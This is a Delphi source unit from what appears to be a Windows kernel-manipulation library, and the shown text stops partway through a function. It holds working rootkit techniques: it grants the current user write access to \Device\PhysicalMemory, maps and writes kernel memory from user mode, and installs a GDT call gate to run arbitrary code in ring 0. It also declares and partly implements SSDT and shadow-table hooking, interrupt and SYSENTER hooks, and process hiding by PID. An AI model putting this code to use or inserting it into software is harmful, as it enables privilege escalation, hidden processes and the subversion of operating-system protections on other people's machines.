unit uallRing0;

interface

uses windows, uallUtil, uallKernel;

{$I mode.inc}

const
  SE_KERNEL_OBJECT = 6;
  GRANT_ACCESS = 1;
  NO_INHERITANCE = 0;
  NO_MULTIPLE_TRUSTEE = 0;
  TRUSTEE_IS_NAME = 1;
  TRUSTEE_IS_USER = 1;

  KGDT_NULL     = 0;
  KGDT_R0_CODE  = 8;
  KGDT_R0_DATA  = 16;
  KGDT_R3_CODE  = 24;
  KGDT_R3_DATA  = 32;
  KGDT_TSS      = 40;
  KGDT_R0_PCR   = 48;
  KGDT_R3_TEB   = 56;
  KGDT_VDM_TILE = 64;
  KGDT_LDT      = 72;
  KGDT_DF_TSS   = 80;
  KGDT_NMI_TSS  = 88;

  SECTION_SIZE = $1000;

type
  PTrustee = ^TTrustee;
  TTrustee = packed record
    pMultipleTrustee          : PTrustee;
    dwMultipleTrusteeOperation: DWord;
    dwTrusteeForm             : DWord;
    dwTrusteeType             : DWord;
    ptstrName                 : PChar;
  end;

  TExplicitAccess = packed record
    dwgrfAccessPermissions: DWord;
    dwgrfAccessMode       : DWord;
    dwgrfInheritance      : DWord;
    Trustee               : TTrustee;
  end;

  TUnicodeString = packed record
    wLength       : Word;
    wMaximumLength: Word;
    pBuffer       : PWideChar;
  end;
  PUnicodeString = ^TUnicodeString;


  PObjectAttributes = ^TObjectAttributes;
  TObjectAttributes = packed record
	  dwLength                 : DWord;
	  dwRootDirectory          : DWord;
	  pObjectName              : PUnicodeString;
	  dwAttributes             : DWord;
	  pSecurityDescriptor      : PSecurityDescriptor;
	  pSecurityQualityOfService: Pointer;
  end;

  PACL = ^TACL;
  TACL = packed record
    bAclRevision: Byte;
    bSbz1       : Byte;
    wAclSize    : Word;
    wAceCount   : Word;
    wSbz2       : Word;
  end;

  TGDT = packed record
    wLimit   : Word;
    wBaseLow : Word;
    wBaseHigh: Word;
  end;

  TPhysicalAddress = LARGE_INTEGER;
  TCallGateDescriptor = packed record
    Offset_0_15   : Word;
    Selector      : Word;
    GateDescriptor: Word;
    Offset_16_31  : Word;
  end;
  PCallGateDescriptor = ^TCallGateDescriptor;

  TPsGCPID = packed record
    fs: Byte;
    mov_eax: Byte;
    estruct: DWord;
    mov_eax_eax: Word;
    epid: DWord;
  end;
  PPsGCPID = ^TPsGCPID;

  TPsGCP = packed record
    fs: Byte;
    mov_eax: Byte;
    estruct: DWord;
    mov_eax_eax: Word;
    epprocess: Byte;
  end;
  PPsGCP = ^TPsGCP;

  TSSDT = packed record
	  pSSAT: Pointer;//              LPVOID  ?      ; System Service Address Table   ( LPVOID[] )
	  dwObsolete: DWord; //           DWORD   ?      ; or maybe: API ID base
	  dwAPICount: DWord;//         DWORD   ?
	  pSSPT: Pointer;//              LPVOID  ?      ; System Service Parameter Table ( BYTE[] )
  end;
  PSSDT = ^TSSDT;

  PSystemModule = ^TSystemModule;
  TSystemModule = packed record
    pNext: PSystemModule;  //00
    u1: DWord;             //04
    u2: DWord;             //08
    u3: DWord;             //0C
    u4: DWord;             //10
    u5: DWord;             //14
    dwModuleHandle: DWord; //18
    dwEntryPoint: DWord;   //1C
    dwSizeOfImage: DWord;  //20
    Path: TUnicodeString;
    Name: TUnicodeString;
  end;

function EnterRing0viaGDT(pFunction: Pointer; dwFunctionsize: DWord): Boolean; stdcall;
function EnterRing0viaSSDT(pFunction: Pointer; dwFunctionsize: DWord): Boolean; stdcall;

function AddressIn4MBPage(pAddress: Pointer): Boolean; stdcall;
function MiniMmGetPhysicalAddress(pAddress: Pointer): Pointer; stdcall;
function MiniMmGetPhysicalPageAddress(pVirtualAddress: Pointer): Pointer; stdcall;
function GetPhysSection: DWord; stdcall;
function SearchNtOsKrnl: DWord; stdcall;

function AllocatePhysMemorySSDT(dwMemSize: DWord): Pointer; stdcall;
procedure FreePhysMemorySSDT(pMemAddr: Pointer; dwMemSize: DWord); stdcall;

function KeServiceDescriptorTable: Pointer; stdcall;

function EnterRing0viaSSDT2(pFunction: Pointer; dwFunctionsize: DWord): Boolean; stdcall;

function LoadAsDriver(FileName: PChar): DWord; stdcall;
procedure UnloadDriver(dwDriverHandle: DWord); stdcall;

function HookSSDT(pFunctionName: PChar; dwDriver: DWord; pCallBackFunction: Pointer; var pOrigFunction: Pointer): Boolean; stdcall;
function UnhookSSDT(pFunctionName: PChar; pOrigFunction: Pointer): Boolean; stdcall;

function GetKernelProcAddress(dwModuleHandle: DWord; pFunctionName: PChar): Pointer; stdcall;

function MmAllocateContiguousMemorySSDT(dwMemSize: DWord): Pointer; stdcall;
procedure MmFreeContiguousMemorySSDT(pAddress: Pointer); stdcall;

function WriteKernelMemory(pDest, pSource: Pointer; dwSize: DWord; bForce: Boolean): Boolean; stdcall;
function ReadKernelMemory(pDest, pSource: Pointer; dwSize: DWord; bForce: Boolean): Boolean; stdcall;
function HookInterrupt(bNumber: Byte; dwDriver: DWord; pCallbackFunction: Pointer; var pOrigFunction: Pointer): Boolean; stdcall;
function HookSysEnter(dwDriver: DWord; pCallbackFunction: Pointer; var pOrigFunction: Pointer): Boolean; stdcall;
function GetServiceNumber(pFunctionName: PChar): Byte; stdcall;
function GetKernelModuleCount2: DWord; stdcall;
function GetKernelModuleByIndex2(dwIndex: DWord; var dwHandle: DWord; var dwModuleSize: DWord; var dwEntryPoint: DWord; var sName: String; var sPath: String): Boolean; stdcall;
function GetKernelModuleHandle(pName: PChar): DWord; stdcall;

function GetKernelModuleSize(dwModuleHandle: DWord): DWord; stdcall;
function GetServiceCount: DWord; stdcall;
function GetServiceCountSSDT: DWord; stdcall;
function GetServiceByIndex(dwIndex: DWord; var sServiceName: String; var dwServiceAddress: DWord): Boolean; stdcall;
function GetServiceAddressByIndex(dwIndex: DWord): DWord; stdcall;
function GetKernelModuleCount: DWord; stdcall;
function GetKernelModuleByIndex(dwIndex: DWord; var dwHandle: DWord; var dwModuleSize: DWord; var dwEntryPoint: DWord; var sName: String; var sPath: String): Boolean; stdcall;

procedure InfoCallBack(P: Pointer); stdcall;

function MapVirtualAddress(pAddress: Pointer; dwSize: DWord; bWriteAble: Boolean): Pointer; stdcall;
function UnmapVirtualAddress(pMappedAddress: Pointer): Boolean; stdcall;

function GetInterruptCount: DWord; stdcall;
function GetInterruptByIndex(dwIndex: DWord; var dwAddress: DWord; var bPresent: Boolean): Boolean; stdcall;
function GetGDTCount: DWord; stdcall;
function GetGDTByIndex(dwIndex: DWord; var dwAddress: DWord; var bPresent: Boolean; var GType: String): Boolean; stdcall;

function GetEProcessCount: DWord; stdcall;
function GetEProcessByIndex(dwIndex: DWord; var dwEProcess: DWord; var sModuleName: String; var dwPID: DWord): Boolean; stdcall;

procedure InitRing0Modules; stdcall;
function SearchPageTable: DWord; stdcall;
function HideEProcessByPID(dwPID: DWord): Boolean; stdcall
function FindShadowTable: Pointer; stdcall;

function GetServiceAddressByIndexShadow(dwIndex: DWord): DWord; stdcall;
function GetServiceCountSSDTShadow(Table: DWord): DWord; stdcall;

function HookShadowTable(dwDriverHandle: DWord; dwServiceNumber: DWord; pCallBackFunction: Pointer; var pOrigFunction: Pointer): Boolean; stdcall;
function UnHookShadowTable(dwServiceNumber: DWord; pOrigFunction: Pointer): Boolean; stdcall;
function GetServiceAddressFromFile(dwServiceID: DWord): DWord; stdcall;
function FindExport(dwHandle: DWord; dwAddr: DWord): String; stdcall;

implementation

var
  ZwOpenSection: function(pSectionHandle: PDWord; dwDesiredAccess: DWord; pObjectAttributes: PObjectAttributes): DWord; stdcall;
  InitUnicodeString: procedure(pUS: PUnicodeString; pName: PWideChar); stdcall;
  GetSecurityInfo: function(dwHandle: DWord; dwObjectType: DWord; dwSecurityInfo: DWord; ppsidOwner: PSID;
    ppsidGroup: PSID; ppDacl: PACL; ppSacl: PACL; ppSecurityDescriptor: PSecurityDescriptor): DWord; stdcall;
  SetSecurityInfo: function(dwHandle: DWord; dwObjectType: DWord; dwSecurityInfo: DWord; ppsidOwner: PSID;
    ppsidGroup: PSID; ppDacl: PACL; ppSacl: PACL): DWORD; stdcall;
  SetEntriesInAclA: function(dwCountOfExplicitEntries: DWord;
    pListOfExplicitEntries: PObjectAttributes; pOldAcl: PACL; pNewAcl: PACL): DWORD; stdcall;

  _mmgetsystemroutineaddress: Pointer = nil;
  MmAllocateNonCachedMemory: function (dwMemSize: DWord): Pointer; stdcall;
  MmFreeNonCachedMemory: function (pMemAddr: Pointer; dwMemSize: DWord): Pointer; stdcall;

  MmAllocateContiguousMemory: function(dwSize: DWord; Phys: TPhysicalAddress): Pointer; stdcall;
  MmFreeContiguousMemory: procedure(dwDriverHandle: DWord); stdcall;

  ntoskrnl: DWord;
  ntoskrnlSize: DWord;
  KeServiceDescriptorTableAddr: Pointer;

  LogBox: procedure(s: PChar); stdcall;

  dwPageTable: DWord;
  PageTable: array[0..$400-1] of DWord;

  SSDTArray: array[0..$1FF] of DWord;
  SSDTArrayShadow: array[0..$1000] of DWord;

  SSDTFile: array[0..$1FF] of DWord;

function FindExport(dwHandle: DWord; dwAddr: DWord): String; stdcall;
var
  IDH: PImageDosHeader;
  INH: PImageNtHeaders;
  EXP: PImageExportDirectory;
  dwExpAddr: DWord;
  i: DWord;
begin
  Result := 'not found';
  if (dwHandle = 0) then
    Exit;

  IDH := Pointer(dwHandle);
  if (IDH^.e_magic <> IMAGE_DOS_SIGNATURE) then
    Exit;

  INH := Pointer(dwHandle+DWord(IDH^._lfanew));
  if (INH^.Signature <> IMAGE_NT_SIGNATURE) then
    Exit;

  if (INH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress = 0) then
    Exit;

  EXP := Pointer(dwHandle + INH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

  if (EXP^.NumberOfFunctions > 0) then
  begin
    for i := 0 to EXP^.NumberOfFunctions-1 do
    begin
      dwExpAddr := DWord(EXP^.AddressOfFunctions)+i*SizeOf(DWord);
      if (dwExpAddr > INH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) and
         (dwExpAddr < INH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+
                      INH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size) then
      begin
        if PDWord(DWord(dwHandle)+dwExpAddr)^ = dwAddr then
        begin
          Result := 'found';
        end;
      end;
    end;
  end;
end;


function GetNameAddr: DWord; stdcall;
var
  pLib: String;
  pLibraryName: PChar;
  iFileHandle: Integer;
  SysDirP    : array [0..MAX_PATH-1] of Char;
  SysDir     : String;
  dwFSize: DWord;
  pMem: Pointer;
  dwRead: DWord;
  DOSH: PImageDosHeader;
  NTH: PImageNtHeaders;
begin
  Result := 0;
  pLib := 'ntoskrnl.exe';
  pLibraryName := PChar(pLib);

  iFileHandle := CreateFileA(pLibraryName,GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
  if (iFileHandle <= 0) then
  begin
    GetSystemDirectory(SysDirP, MAX_PATH);
    SysDir := SysDirP;
    iFileHandle := CreateFileA(PChar(SysDir+'\'+pLibraryName),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    if (iFileHandle <= 0) then
      iFileHandle := CreateFileA(PChar(SysDir+'\DRIVERS\'+pLibraryName),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
      if (iFileHandle <= 0) then
        Exit;
  end;

  dwFSize := GetFileSize(iFileHandle,nil);
  if (dwFSize = 0) then
  begin
    CloseHandle(iFileHandle);
    Exit;
  end;

  pMem := VirtualAlloc(nil,dwFSize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE);
  if (pMem = nil) then
  begin
    CloseHandle(iFileHandle);
    Exit;
  end;

  ReadFile(iFileHandle,pMem^,dwFSize,dwRead,nil);
  if (dwFSize <> dwRead) then
  begin
    CloseHandle(iFileHandle);
    VirtualFree(pMem,dwFSize,MEM_DECOMMIT);
    Exit;
  end;
  DOSH := PImageDosHeader(pMem);
  if (DOSH^.e_magic = IMAGE_DOS_SIGNATURE) then
  begin
    NTH := PImageNtHeaders(DOSH^._lfanew+Integer(pMem));
    if (NTH^.Signature = IMAGE_NT_SIGNATURE) then
    begin
      if (NTH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress <> 0) then
        Result := PImageExportDirectory(DWord(DOSH)+NTH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress).Name;
    end;
  end;

  CloseHandle(iFileHandle);
  VirtualFree(pMem,dwFSize,MEM_DECOMMIT);
end;

function GetServiceAddressFromFile(dwServiceID: DWord): DWord; stdcall;
var
  pLib: String;
  pLibraryName: PChar;
  iFileHandle: Integer;
  SysDirP    : array [0..MAX_PATH-1] of Char;
  SysDir     : String;
  dwFSize: DWord;
  pMem: Pointer;
  dwRead: DWord;
  dwOffset: DWord;
  DOSH: PImageDosHeader;
  NTH: PImageNtHeaders;
  i: DWord;
begin
  if (dwServiceID < High(SSDTFile)) and
     (SSDTFile[dwServiceID] <> 0) then
  begin
    Result := SSDTFile[dwServiceID];
    Exit;
  end;

  Result := 0;
  pLib := 'ntoskrnl.exe';
  pLibraryName := PChar(pLib);

  if (not ReadKernelMemory(@dwOffset,KeServiceDescriptorTableAddr,4,False)) then
    Exit;
  if (dwOffset = 0) then
    Exit;
  if (ntoskrnl = 0) then
    Exit;

  dwOffset := dwOffset-DWord(ntoskrnl);

  iFileHandle := CreateFileA(pLibraryName,GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
  if (iFileHandle <= 0) then
  begin
    GetSystemDirectory(SysDirP, MAX_PATH);
    SysDir := SysDirP;
    iFileHandle := CreateFileA(PChar(SysDir+'\'+pLibraryName),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    if (iFileHandle <= 0) then
      iFileHandle := CreateFileA(PChar(SysDir+'\DRIVERS\'+pLibraryName),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
      if (iFileHandle <= 0) then
        Exit;
  end;

  dwFSize := GetFileSize(iFileHandle,nil);
  if (dwFSize = 0) then
  begin
    CloseHandle(iFileHandle);
    Exit;
  end;

  if ((dwOffset+dwServiceID*4) > dwFSize) then
  begin
    CloseHandle(iFileHandle);
    Exit;
  end;

  pMem := VirtualAlloc(nil,dwFSize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE);
  if (pMem = nil) then
  begin
    CloseHandle(iFileHandle);
    Exit;
  end;

  ReadFile(iFileHandle,pMem^,dwFSize,dwRead,nil);
  if (dwFSize <> dwRead) then
  begin
    CloseHandle(iFileHandle);
    VirtualFree(pMem,dwFSize,MEM_DECOMMIT);
    Exit;
  end;
  DOSH := PImageDosHeader(pMem);
  if (DOSH^.e_magic = IMAGE_DOS_SIGNATURE) then
  begin
    NTH := PImageNtHeaders(DOSH^._lfanew+Integer(pMem));
    if (NTH^.Signature = IMAGE_NT_SIGNATURE) then
    begin
      i := 0;
      while (PDWord(DWord(PMem)+dwOffset+i*4)^ > NTH^.OptionalHeader.ImageBase) and (i <= high(SSDTFile)) do
      begin
        SSDTFile[i] := PDWord(DWord(PMem)+dwOffset+i*4)^-NTH^.OptionalHeader.ImageBase+ntoskrnl;
        Inc(i);
      end;
      if (dwServiceID < High(SSDTFile)) and
         (SSDTFile[dwServiceID] <> 0) then
        Result := SSDTFile[dwServiceID];
    end;
  end;

  CloseHandle(iFileHandle);
  VirtualFree(pMem,dwFSize,MEM_DECOMMIT);
end;

function GetServiceCountSSDTShadow(Table: DWord): DWord; stdcall;
var
  SSDT: TSSDT;
  Ki: DWord;
  i: DWord;
  Finished: Boolean;
begin
  Result := 0;
  if (Table > 4) then
    Exit;
  KI  := DWord(FindShadowTable);
  if (KI = 0) then
    Exit;
  KI := KI+Table*SizeOf(TSSDT);
  if ReadKernelMemory(@SSDT,Pointer(Ki),SizeOf(SSDT),False) then
  begin
    i := 0;
    repeat
      ReadKernelMemory(@SSDTArrayShadow[i],Pointer(DWord(SSDT.pSSAT)+i*4),4,False);
      Finished := (SSDTArrayShadow[i] < $80000000);
      Inc(i);
    until (i > High(SSDTArrayShadow)) or (Finished);
    Result := i-1;
  end;
end;

function HookShadowTable(dwDriverHandle: DWord; dwServiceNumber: DWord; pCallBackFunction: Pointer; var pOrigFunction: Pointer): Boolean; stdcall;
var
  dwSCount: DWord;
  ST: Pointer;
  SSDT: TSSDT;
begin
  Result := False;
  if (dwServiceNumber <= $1000) then
  begin
    dwSCount := GetServiceCountSSDTShadow(0);
    if (dwSCount < dwServiceNumber) then
      Exit;
  end else
  begin
    dwSCount := GetServiceCountSSDTShadow(1);
    if (dwSCount < (dwServiceNumber-$1000)) then
      Exit;
  end;
  ST := FindShadowTable;
  if (dwServiceNumber > $1000) then
    ST := Pointer(DWord(ST)+SizeOf(TSSDT));
  if (not ReadKernelMemory(@SSDT,ST,SizeOf(TSSDT),False)) then
    Exit;
  if (not ReadKernelMemory(@ST,Pointer(DWord(SSDT.pSSAT)+SizeOf(Pointer)*(dwServiceNumber and $FFF)), SizeOf(Pointer), False)) then
    Exit;
  if (DWord(ST) < $80000000) then
    Exit;

  pOrigFunction := ST;
  if (DWord(pCallBackFunction) < $80000000) then
    pCallBackFunction := Pointer(DWord(pCallBackFunction)-GetModuleHandleA(nil)+dwDriverHandle);
  if (not WriteKernelMemory(Pointer(DWord(@pOrigFunction)-GetModuleHandleA(nil)+dwDriverHandle),@ST,SizeOf(Pointer),False)) then
    Exit;
  if (not WriteKernelMemory(Pointer(DWord(SSDT.pSSAT)+SizeOf(Pointer)*(dwServiceNumber and $FFF)),@pCallbackFunction, SizeOf(Pointer),False)) then
    Exit;
  Result := True;
end;

function UnHookShadowTable(dwServiceNumber: DWord; pOrigFunction: Pointer): Boolean; stdcall;
var
  dwSCount: DWord;
  ST: Pointer;
  SSDT: TSSDT;
begin
  Result := False;
  if (dwServiceNumber <= $1000) then
  begin
    dwSCount := GetServiceCountSSDTShadow(0);
    if (dwSCount < dwServiceNumber) then
      Exit;
  end else
  begin
    dwSCount := GetServiceCountSSDTShadow(1);
    if (dwSCount < (dwServiceNumber-$1000)) then
      Exit;
  end;
  ST := FindShadowTable;
  if (dwServiceNumber > $1000) then
    ST := Pointer(DWord(ST)+SizeOf(TSSDT));
  if (not ReadKernelMemory(@SSDT,ST,SizeOf(TSSDT),False)) then
    Exit;
  if (not ReadKernelMemory(@ST,Pointer(DWord(SSDT.pSSAT)+SizeOf(Pointer)*(dwServiceNumber and $FFF)), SizeOf(Pointer), False)) then
    Exit;
  if (DWord(ST) < $80000000) then
    Exit;
  if (not WriteKernelMemory(Pointer(DWord(SSDT.pSSAT)+SizeOf(Pointer)*(dwServiceNumber and $FFF)),@pOrigFunction, SizeOf(Pointer),False)) then
    Exit;
  Result := True;
end;

function GetServiceAddressByIndexShadow(dwIndex: DWord): DWord; stdcall;
begin
  Result := 0;
  if (dwIndex <= High(SSDTArrayShadow)) then
    Result := SSDTArrayShadow[dwIndex];
end;

procedure InfoCallBack(P: Pointer); stdcall;
begin
  @LogBox := p;
end;

procedure WriteLog(sString: String);
begin
  if (@LogBox <> nil) then
    LogBox(PChar(sString));
end;

function FindShadowTable: Pointer;
var
  AddSST: Pointer;
  SSDTS: pointer;
  SDT1: TSSDT;
  SDT2: TSSDT;
  i: DWord;
begin
  Result := nil;
  if (ntoskrnl = 0) then
    Exit;
  AddSST := GetKernelProcAddress(ntoskrnl,'KeAddSystemServiceTable');
  ReadKernelMemory(@SDT1,KeServiceDescriptorTable,SizeOf(TSSDT),False);
  for i := 0 to $100-1 do
  begin
    if ReadKernelMemory(@SSDTS,Pointer(DWord(AddSST)+i*4),SizeOf(Pointer),False) then
    if (DWord(SSDTS) > $80000000) then
    if ReadKernelMemory(@SDT2,SSDTS,SizeOf(Pointer),False) then
    if (SDT1.pSSAT = SDT2.pSSAT) then
      Result := SSDTS;
  end;
end;

procedure InitRing0Modules; stdcall;
begin
  WriteLog('Start Ring0Module Init...');

  @ZwOpenSection := GetProcAddress(GetModuleHandle('ntdll.dll'),'ZwOpenSection');
  @InitUnicodeString := GetProcAddress(GetModuleHandle('ntdll.dll'),'RtlInitUnicodeString');
  @GetSecurityInfo := GetProcAddress(GetModuleHandle('advapi32.dll'),'GetSecurityInfo');
  @SetSecurityInfo := GetProcAddress(GetModuleHandle('advapi32.dll'),'SetSecurityInfo');
  @SetEntriesInAclA := GetProcAddress(GetModuleHandle('advapi32.dll'),'SetEntriesInAclA');

  ntoskrnl := SearchNtOsKrnl;
  ntoskrnlSize := GetKernelModuleSize(ntoskrnl);

  if (ntoskrnl <> 0) then
  begin
    _mmgetsystemroutineaddress := GetKernelProcAddress(
      ntoskrnl,'MmGetSystemRoutineAddress');
    KeServiceDescriptorTableAddr := GetKernelProcAddress(
      ntoskrnl,'KeServiceDescriptorTable');
    @MmAllocateNonCachedMemory := GetKernelProcAddress(
      ntoskrnl,'MmAllocateNonCachedMemory');
    @MmFreeNonCachedMemory := GetKernelProcAddress(
      ntoskrnl,'MmFreeNonCachedMemory');
    @MmAllocateNonCachedMemory := GetKernelProcAddress(
      ntoskrnl,'MmAllocateNonCachedMemory');
    @MmFreeNonCachedMemory := GetKernelProcAddress(
      ntoskrnl,'MmFreeNonCachedMemory');
    @MmAllocateContiguousMemory := GetKernelProcAddress(
      ntoskrnl,'MmAllocateContiguousMemory');
  end;

  dwPageTable := SearchPageTable;
  if not ReadKernelMemory(@PageTable[0],Pointer(dwPageTable+$80000000), $400*4, False) then
    dwPageTable := 0;

  WriteLog('  - NtOsKrnl Base: '+inttohex(ntoskrnl,8));
  WriteLog('  - NtOsKrnl Size: '+inttohex(ntoskrnlSize,8));
  WriteLog('  - PageDir Base: '+inttohex(dwPageTable,8));

  if (dwPageTable = 0) or (ntoskrnl = 0) or (ntoskrnlsize = 0) then
    WriteLog('Error while initializing ring0 modules') else
    WriteLog('Successful Ring0Module initialized!');
end;

function AddressIn4MBPage(pAddress: Pointer): Boolean; stdcall;
begin
  Result := (DWord(pAddress) > 0) and ($80000000 <= DWord(pAddress)) and (DWord(pAddress) < $A0000000);
end;

function MiniMmGetPhysicalAddress(pAddress: Pointer): Pointer; stdcall;
begin
  if AddressIn4MBPage(pAddress) then
    Result := Pointer(DWord(pAddress) - $80000000) else
    Result := Pointer($FFFFFFFF);
end;

function MiniMmGetPhysicalPageAddress(pVirtualAddress: Pointer): Pointer; stdcall;
begin
 if AddressIn4MBPage(pVirtualAddress) then
   Result := Pointer(DWord(pVirtualAddress) and $1FFFF000) else
   Result := Pointer($FFFFFFFF);
end;

function GetPhysSection: DWord; stdcall;
var
  dwSection: DWord;
  Access   : TExplicitAccess;
  oa       : TObjectAttributes;
  str      : TUnicodeString;
  pOldDacl : PAcl;
  pNewDacl : PACL;
  pSecurity: PSecurityDescriptor;
begin
  Result := 0;
  if (@ZwOpenSection = nil) or (@InitUnicodeString = nil) or (@GetSecurityInfo = nil) or
     (@SetSecurityInfo = nil) or (@SetEntriesInAclA = nil) then
    Exit;

  InitUnicodeString(@str,'\Device\PhysicalMemory');
  oa.dwLength := SizeOf(TObjectAttributes);
  oa.pObjectName := @Str;
  oa.dwRootDirectory := 0;
  oa.dwAttributes := 0;
  oa.pSecurityDescriptor := nil;
  oa.pSecurityQualityOfService := nil;
  pNewDacl := nil;
  pOldDacl := nil;
  pSecurity := nil;

  if ZwOpenSection(@dwSection, WRITE_DAC or READ_CONTROL, @oa) = 0 then
  begin
    ZeroMemory(@Access, sizeof(TExplicitAccess));
    if GetSecurityInfo(dwSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, nil, nil, @pOldDacl, nil, @pSecurity) = 0 then
    begin
      Access.dwgrfAccessPermissions := SECTION_MAP_WRITE;
      Access.dwgrfAccessMode        := GRANT_ACCESS;
      Access.dwgrfInheritance       := NO_INHERITANCE;
      Access.Trustee.dwMultipleTrusteeOperation := NO_MULTIPLE_TRUSTEE;
      Access.Trustee.dwTrusteeForm  := TRUSTEE_IS_NAME;
      Access.Trustee.dwTrusteeType  := TRUSTEE_IS_USER;
      Access.Trustee.ptstrName := 'CURRENT_USER';
      if SetEntriesInAclA(1,@Access, pOldDacl, @pNewDacl) = 0 then
      begin
        if SetSecurityInfo(dwSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, nil, nil, pNewDacl, nil) = 0 then
        begin
        end;
      end;
    end;
  end;
  if ZwOpenSection(@dwSection, SECTION_MAP_READ or SECTION_MAP_WRITE, @oa) = 0 then
    Result := dwSection;

//  if (Result = 0) then
//    WriteLog('Error in GetPhysSection');
end;

function MapVirtualAddress(pAddress: Pointer; dwSize: DWord; bWriteAble: Boolean): Pointer; stdcall;
type
  TMapTable = array[0..$400-1] of DWord;
  PMapTable = ^TMapTable;
var
  dwSection: DWord;
  pMap: PMapTable;
  MemoryStatus: TMemoryStatus;
begin
  Result := nil;

  dwSection := GetPhysSection;
  if (dwSection <> 0) then
  begin
    GlobalMemoryStatus(MemoryStatus);
    if (DWord(pAddress) >= $80000000) and (DWord(pAddress) < $80000000 + MemoryStatus.dwTotalPhys) then
    begin
      Result := MapViewOfFile(dwSection, FILE_MAP_READ or (FILE_MAP_WRITE * DWord(bWriteable)),
        0, DWord(pAddress)-$80000000, dwSize);
    end else
    if (dwPageTable <> 0) then
    begin
      ReadKernelMemory(@PageTable[0],Pointer(dwPageTable+$80000000), $400*4, False);
      pMap := MapViewOfFile(dwSection, FILE_MAP_READ, 0, PageTable[DWord(pAddress) shr 22] and $FFFFF000, $1000);
      if (pMap <> nil) then
      begin
        Result := MapViewOfFile(dwSection, FILE_MAP_READ or (FILE_MAP_WRITE * DWord(bWriteable)), 0,
          pMap^[(DWord(pAddress) shr 12) and $3FF] and $FFFFF000, dwSize);
        UnmapViewOfFile(pMap);
      end;
    end;
    CloseHandle(dwSection);
  end;
//  if (Result = nil) then
//    WriteLog('Error in mapping Virtual Address: '+IntToHex(DWord(pAddress),8)+' Size: '+IntToHex(dwSize,8));
end;

function UnmapVirtualAddress(pMappedAddress: Pointer): Boolean; stdcall;
begin
  Result := UnmapViewOfFile(pMappedAddress);
end;


function EnterRing0viaGDT(pFunction: Pointer; dwFunctionsize: DWord): Boolean; stdcall;
var
  GDT: TGDT;
  BaseAddress: Pointer;
  cg: PCallGateDescriptor;
  ct: PCallGateDescriptor;
  farcall : array [0..2] of Word;
begin
  asm
    SGDT DWORD PTR [GDT]
  end;

  Result := False;
  BaseAddress := MapVirtualAddress(Pointer(GDT.wBaseHigh shl 16 or gdt.wBaseLow),(GDT.wLimit+1), True);
  if (BaseAddress <> nil) then
  begin
    cg := Pointer(DWord(BaseAddress)+8);  // Get first CallGate
    ct := nil;
    while (DWord(cg) < DWord(BaseAddress)+(GDT.wLimit and $FFF8)) and (ct = nil) do
    begin
      if (cg.GateDescriptor and $0F00 = 0) then  // call gate not present
      begin
        // install callgate
        cg.Offset_0_15 := DWord(pFunction) and $FFFF;
        cg.Selector := KGDT_R0_CODE; // ring 0 code
        // [Installed flag=1] [Ring 3 code can call=11] 0 [386 call gate=1100] 00000000
        cg.GateDescriptor := $EC00;
        cg.Offset_16_31 := DWord(pFunction) shr $10;
        ct := cg;
      end;
      cg := Pointer(DWord(cg)+8);       // Get next CallGate
    end;

    if (ct = nil) then
    begin
      UnMapViewOfFile(BaseAddress);
    end else
    begin
      farcall[0] := 0;
      farcall[1] := 0;
      farcall[2] := (short(ULONG(ct)-ULONG(BaseAddress))) or 3;  //Ring 3 callgate;
      if VirtualLock(pFunction, dwFunctionSize) then
      begin
        try
          SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
          Sleep(0);
          asm
            // call callgate
            //  push arg1 ... argN  // call far fword ptr [farcall]
            LEA EAX, farcall  // load to EAX
            DB 0FFH, 018H  // hardware code, means call fword ptr [eax]
          end;
          SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_NORMAL);
          Result := True;
        except
        end;
      end;
      VirtualUnlock(pFunction, dwFunctionSize);
      FillChar(ct^, 8, 0);
      UnmapVirtualAddress(BaseAddress);
    end;
  end;
end;

function GetKernelModuleSize(dwModuleHandle: DWord): DWord; stdcall;
var
  pIDH: PImageDosHeader;
  pINH: PImageNtHeaders;
begin
  pIDH := MapVirtualAddress(Pointer(dwModuleHandle),SECTION_SIZE, False);
  Result := 0;
  if (pIDH <> nil) then
  begin
    if (pIDH^.e_magic = IMAGE_DOS_SIGNATURE) and (pIDH^._lfanew+4 < $1000) then
    begin
      pINH := Pointer(DWord(pIDH)+DWord(pIDH^._lfanew));
      if (pINH^.Signature = IMAGE_NT_SIGNATURE) and (pINH^.OptionalHeader.SizeOfImage <> 0) then
        Result := pINH^.OptionalHeader.SizeOfImage;
    end;
    UnmapVirtualAddress(pIDH);
  end;
end;

function SearchNtOsKrnl: DWord; stdcall;
var
  dwLoop: DWord;
  bFound: Boolean;
  pIDH: PImageDosHeader;
  pINH: PImageNtHeaders;
  pExportDirectory: PImageExportDirectory;
  Str: String;
  pIDHf: Pointer;
  MemoryStatus: TMemoryStatus;
  dllh: DWord;
  BaseNormal: DWord;
  SizeNormal: DWord;
begin
  dllh := LoadLibraryEx('ntoskrnl.exe',0,DONT_RESOLVE_DLL_REFERENCES);
  BaseNormal := 0;
